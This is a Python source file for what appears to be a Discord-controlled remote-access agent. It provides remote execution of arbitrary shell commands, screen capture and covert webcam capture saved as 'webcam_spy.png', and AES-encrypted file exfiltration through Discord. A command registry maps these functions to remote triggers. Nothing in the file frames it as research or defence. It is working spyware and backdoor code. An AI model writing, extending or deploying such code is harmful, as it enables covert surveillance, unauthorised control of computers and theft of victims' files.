import platform
import os
import datetime
import subprocess
import discord
import sys
from mss import mss
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import config
import shlex

# --- ENCRYPTION HELPER ---
def encrypt_file(filepath):
    try:
        aesgcm = AESGCM(config.AES_KEY)
        nonce = os.urandom(12)
        with open(filepath, 'rb') as f:
            data = f.read()
        ciphertext = aesgcm.encrypt(nonce, data, None)
        enc_filename = os.path.basename(filepath) + ".enc"
        enc_path = os.path.join(config.TEMP_DIR, enc_filename)
        with open(enc_path, 'wb') as f:
            f.write(nonce + ciphertext)
        return enc_path
    except Exception as e:
        return None

def run_terminal_command(command_str):
    """
    Executes a terminal command SECURELY (No Shell Injection).
    """
    if not command_str: 
        return "⚠️ Error: You must provide a command. Example: ⚡ whoami"
    
    try:
        # 1. Sanitize: Split string into a safe list
        # POSIX=False preserves quotes on Windows
        args = shlex.split(command_str, posix=(platform.system() != "Windows"))
        
        # 2. Execute directly (shell=False is the default, but let's be explicit)
        # capture_output=True grabs what would have been printed to screen
        result = subprocess.run(
            args, 
            shell=False,        # <--- THE BIG FIX
            capture_output=True, 
            text=True, 
            timeout=15
        )
        
        output = result.stdout + result.stderr
        
        if not output:
            return "✅ Command executed successfully (No text output)."
            
        if len(output) > 1900:
            return f"⚠️ Output too long ({len(output)} chars). Truncated:\n{output[:1900]}..."
            
        return output

    except FileNotFoundError:
        # This happens if the command (e.g., 'ls') isn't found in the PATH
        return f"⚠️ Error: Command '{args[0]}' not found."
    except subprocess.TimeoutExpired:
        return "⚠️ Error: Command timed out."
    except Exception as e:
        return f"⚠️ Execution Error: {str(e)}"

def get_system_info(args=None):
    data = f"🖥️ OS: {platform.system()} {platform.release()}\n"
    data += f"👤 Node: {platform.node()}\n"
    return data

def try_everything_snapshot(args=None):
    filename = os.path.join(config.TEMP_DIR, "evidence.png")
    if os.path.exists(filename): os.remove(filename)
    
    log = ""
    # 1. Try Screen
    try:
        with mss() as sct:
            sct.shot(mon=1, output=filename)
        if os.path.exists(filename) and os.path.getsize(filename) > 0:
            return discord.File(filename)
    except Exception as e:
        log += f"[Screen: {e}] "

    # 2. Try Webcam
    try:
        subprocess.run(
            ["fswebcam", "-r", "1280x720", "--no-banner", "-S", "20", filename],
            capture_output=True, text=True, timeout=5
        )
        if os.path.exists(filename):
            return discord.File(filename, filename="webcam_spy.png")
    except Exception as e:
        log += f"[Cam: {e}]"

    return f"⚠️ BLIND AGENT. Log: {log}"

def exfiltrate_file(filepath):
    if not filepath: return "⚠️ Error: No file path."
    if not os.path.exists(filepath): return "⚠️ Error: File not found."
    try:
        encrypted_path = encrypt_file(filepath)
        if encrypted_path:
            return discord.File(encrypted_path)
        return "⚠️ Encryption failed."
    except Exception as e:
        return f"⚠️ Exfil Error: {str(e)}"

def ping_pong(args=None):
    return "🏓 Pong! Agent ready."

def remote_exit(args=None):
    sys.exit(0)

# --- REGISTRY ---
EXEC_REGISTRY = {
    'cmd_shell': get_system_info,
    'cmd_screenshot': try_everything_snapshot,
    'cmd_ping': ping_pong,
    'cmd_exfil': exfiltrate_file,
    'cmd_exit': remote_exit,
    'cmd_exec': run_terminal_command  
}